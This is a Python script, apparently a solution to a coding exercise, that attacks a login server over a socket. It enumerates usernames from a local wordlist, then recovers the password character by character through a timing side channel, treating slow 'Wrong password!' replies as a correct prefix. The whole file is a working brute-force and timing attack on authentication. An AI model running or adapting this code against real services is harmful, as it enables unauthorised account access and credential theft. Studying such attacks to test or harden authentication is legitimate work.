import sys
import socket
import json
import string
import os.path
import time



arg = sys.argv
path = os.path.join('C:\\', 'Users', 'галуцких', 'Downloads', 'logins.txt')
flag = 0


with socket.socket() as client_socket, open(path, 'r', encoding='utf-8') as login_file:
	hostname = arg[1]
	port = int(arg[2])
	address = (hostname, port)
	client_socket.connect(address)

	login_password = {'login': ' ',
	                  'password': ' '}
	for elem in login_file:
		login_password['login'] = elem.strip('\n')
		logins = json.dumps(login_password).encode()
		client_socket.send(logins)
		result = client_socket.recv(1024)
		results = json.loads(result.decode())
		if results['result'] == "Wrong password!":
			break

	stroke = string.ascii_lowercase + string.ascii_uppercase + string.digits
	login_password['password'] = ''
	flag = True
	while flag:
		for elem in stroke:
			password = login_password['password'] + elem
			data = json.dumps({'login': login_password['login'], 'password': password}).encode()
			client_socket.send(data)
			start = time.perf_counter()
			result = client_socket.recv(1024)
			end = time.perf_counter()
			results = json.loads(result.decode())
			if results['result'] == 'Wrong password!' and (end - start > 0.1):
				login_password['password'] += elem
				break
			elif results['result'] == 'Connection success!':
				login_password['password'] += elem
				print(json.dumps(login_password, indent=4))
				flag = False
				break
